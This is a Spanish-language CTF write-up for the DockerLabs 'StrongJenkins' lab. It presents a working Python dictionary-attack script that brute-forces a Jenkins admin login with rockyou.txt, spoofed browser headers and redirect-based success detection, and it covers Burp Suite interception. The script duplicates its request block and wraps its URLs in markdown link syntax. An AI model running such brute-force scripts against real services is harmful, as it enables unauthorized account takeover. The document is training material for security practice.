# Write-up CTF: StrongJenkins - Ataque de Fuerza Bruta con Python



Este documento detalla la resolución del CTF **"StrongJenkins"** de [DockerLabs.es](https://dockerlabs.es/). A diferencia de un CTF con múltiples fases, el enfoque de este reto es puramente un **ataque de fuerza bruta por diccionario** a un panel de login, automatizado mediante un script en Python.

El objetivo es demostrar cómo se puede crear un script sencillo para probar miles de contraseñas de un diccionario contra un formulario web hasta encontrar la correcta.

---

## 📜 Índice

1.  [Escenario y Objetivo](#-escenario-y-objetivo)
2.  [Prerrequisitos](#-prerrequisitos)
3.  [Paso 1: Despliegue del Entorno](#-paso-1-despliegue-del-entorno)
4.  [Paso 2: Identificación del Objetivo](#-paso-2-identificaci%C3%B3n-del-objetivo)
5.  [Paso 3: Creación del Script de Fuerza Bruta](#-paso-3-creaci%C3%B3n-del-script-de-fuerza-bruta)
6.  [Paso 4: Ejecución y Resultado](#-paso-4-ejecuci%C3%B3n-y-resultado)
7.  [Conclusión y Aprendizajes](#-conclusi%C3%B3n-y-aprendizajes)

---

## 📝 Escenario y Objetivo

El CTF presenta un contenedor Docker con una instancia de **Jenkins** en ejecución. El panel de administración está protegido por un formulario de login para el usuario `admin`.

El objetivo es encontrar la contraseña de este usuario utilizando el diccionario **`rockyou.txt`** y un script de Python para automatizar el proceso.

---

## 🛠️ Prerrequisitos

* **Docker:** Para ejecutar el contenedor del CTF.
* **Python 3:** Para ejecutar el script de ataque.
* **Librería `requests`:** Se instala con `pip install requests`.
* **Diccionario `rockyou.txt`:** Uno de los diccionarios de contraseñas más comunes.

---

## 🚀 Paso 1: Despliegue del Entorno

Primero, iniciamos el contenedor de Docker que aloja la instancia vulnerable de Jenkins.

<img width="827" height="552" alt="image" src="https://github.com/user-attachments/assets/edd5a8d8-b269-4230-800a-cbf5ff0bb59c" />


```bash
# Comando para iniciar el laboratorio de DockerLabs (puede variar)
docker run --rm -it -p 8080:8080 vavkamil/strongjenkins

```


## 🎯 Paso 2: Identificación del Objetivo e Interceptacion con Burp Suite

Al navegar a http://172.17.0.2:8080 en un navegador, nos encontramos con el panel de login de Jenkins. Este será el objetivo de nuestro ataque.

Pasos a seguir:

Configura tu navegador para que use Burp Suite como proxy (normalmente en 127.0.0.1:8080).

En Burp Suite, ve a la pestaña Proxy -> Intercept y asegúrate de que la intercepción esté activada ("Intercept is on").

En el navegador, ve a la página de login de Jenkins e intenta iniciar sesión con cualquier credencial (ej: admin:password).

Burp Suite capturará la petición POST. Aquí podemos ver la URL exacta (/j_spring_security_check), los datos enviados (j_username, j_password) y, lo más importante, las cabeceras (headers).

<img width="1276" height="695" alt="image" src="https://github.com/user-attachments/assets/f1ec72bf-31f3-4560-9749-687c5bcc8606" />


<img width="1292" height="615" alt="image" src="https://github.com/user-attachments/assets/e217b4e5-eb42-4b4b-b610-4680c12d7c66" />





## 🐍 Paso 3: Creación del Script de Fuerza Bruta

El corazón de la solución es un script de Python que automatiza el envío de credenciales.

Concepto: Un ataque de fuerza bruta por diccionario consiste en probar sistemáticamente todas las palabras de una lista (el diccionario) como contraseñas para un usuario específico, en este caso, admin.



```bash
import requests

url = '[http://172.17.0.2:8080/j_spring_security_check](http://172.17.0.2:8080/j_spring_security_check)'
diccionario = 'rockyou.txt'

headers = {
    'Host': '172.17.0.2:8080',
    'User-Agent': 'Mozilla/5.0 (X11; kali; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': '[http://172.17.0.2:8080](http://172.17.0.2:8080)',
    'Connection': 'keep-alive',
    'Referer': '[http://172.17.0.2:8080/login?from=%2F](http://172.17.0.2:8080/login?from=%2F)',
}

with open(diccionario, 'r', encoding='latin-1') as file:
    for line in file:
        password_sin_espacios = line.strip()
        acceso = {
          'j_username': 'admin',
          'j_password': password_sin_espacios,
          'from': '/',
          'Submit': ''
        }
        
        response = requests.post(url, headers=headers, data=acceso, allow_redirects=False)

        if response.status_code == 302 and response.headers.get('Location') != '[http://172.17.0.2:8080/loginError](http://172.17.0.2:8080/loginError)':
            print(f"Login correcto con el usuario admin y contraseña {password_sin_espacios}")
            break
        else:
            print(f"Intento fallido con la contraseña {password_sin_espacios}")


        
        response = requests.post(url, headers=headers, data=acceso, allow_redirects=False)

        if response.status_code == 302 and response.headers.get('Location') != '[http://172.17.0.2:8080/loginError](http://172.17.0.2:8080/loginError)':
            print(f"Login correcto con el usuario admin y contraseña {password_sin_espacios}")
            break
        else:
            print(f"Intento fallido con la contraseña {password_sin_espacios}")

```

## Explicación del Código

import requests: Importa la librería necesaria para realizar peticiones HTTP.

 url y diccionario:  Variables que almacenan la URL del endpoint de autenticación y el nombre de nuestro diccionario.

headers: Un diccionario que simula las cabeceras de un navegador real para que la petición parezca legítima.

with open(...): Abre el archivo rockyou.txt. Se especifica encoding='latin-1' porque este diccionario antiguo contiene caracteres que darían error con la codificación por defecto (UTF-8).

for line in file:: Inicia un bucle que leerá el diccionario línea por línea. Cada línea es una posible contraseña.

line.strip(): Limpia los espacios en blanco o saltos de línea de la contraseña leída.

acceso = {...}: Crea el diccionario data que se enviará en el cuerpo de la petición POST. El valor de j_password se actualiza en cada iteración del bucle.

requests.post(...): Envía la petición HTTP de tipo POST.

allow_redirects=False: Este es el truco clave. Le decimos a requests que no siga las redirecciones automáticamente.

if response.status_code == 302 ...: Esta es la lógica para detectar el éxito.

Un login fallido en Jenkins hace que la página se recargue, pero la cabecera Location apunta a /loginError.

Un login exitoso devuelve un código de estado 302 (Redirección) y la cabecera Location apunta al panel principal (/), no a la página de error.

Si se cumple esta condición, hemos encontrado la contraseña.

break: Si la contraseña es correcta, este comando detiene el bucle para no seguir probando contraseñas innecesariamente.






 ## 🏁 Paso 4: Ejecución y Resultado

Guardamos el código como script.py y lo ejecutamos desde la terminal.

```bash

python3 script.py
```
El script comenzará a probar cada contraseña del diccionario, mostrando "Intento fallido"  por cada contraseña intentada.Despues de un tiempo encontrará la correcta
y se detendrá para evitar un uso de procesamiento inncesario. 

<img width="813" height="560" alt="image" src="https://github.com/user-attachments/assets/6f3b552e-6f1e-4c4a-aa3d-311b531c2db2" />



 ## 🧠 Conclusión y Aprendizajes

Este CTF, aunque sencillo, es una práctica excelente sobre conceptos clave:

Automatización de Tareas: El poder de Python para automatizar tareas repetitivas como probar miles de contraseñas.

Ataques de Fuerza Bruta: Entender la mecánica de uno de los ataques de autenticación más comunes.

Análisis de Respuestas HTTP: La importancia de analizar no solo el contenido de una respuesta web, sino también sus códigos de estado y cabeceras (Location, Set-Cookie, etc.) para entender el comportamiento de la aplicación.

Seguridad de Contraseñas: Demuestra de forma práctica por qué usar contraseñas débiles o comunes (presentes en diccionarios) es extremadamente inseguro.
